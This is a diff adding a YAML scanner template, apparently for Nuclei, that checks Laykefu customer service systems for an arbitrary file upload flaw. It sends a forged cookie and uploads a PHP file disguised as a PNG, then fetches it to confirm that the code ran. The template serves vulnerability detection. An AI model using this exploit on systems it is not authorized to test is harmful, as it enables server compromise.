@@ -1,0 +1,66 @@
+id: poc-laykefu-anyfile-upload
+
+info:
+  name: Laykefu Customer Service System Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/admin/users/upavatar.html"
+    headers:
+      X-Requested-With: XMLHttpRequest
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3OCVBiwBVsNuB2kR
+      Cookie: user_name=1; user_id=3
+    body: |-
+      ------WebKitFormBoundary3OCVBiwBVsNuB2kR
+      Content-Disposition: form-data; name="file"; filename="1.php"
+      Content-Type: image/png
+
+      <?php echo {{t1}};?>
+      ------WebKitFormBoundary3OCVBiwBVsNuB2kR--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"msg\":\"ok\""
+      - type: word
+        part: header
+        words:
+          - "application/json"
+    extractors:
+      - type: regex
+        name: time
+        part: body
+        internal: true
+        regex:
+          - "(?P<time>[0-9]{8})"
+      - type: regex
+        name: file
+        part: body
+        internal: true
+        regex:
+          - "(?P<file>[0-9a-z]{32})"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/uploads/{{time}}/{{file}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t1}}"
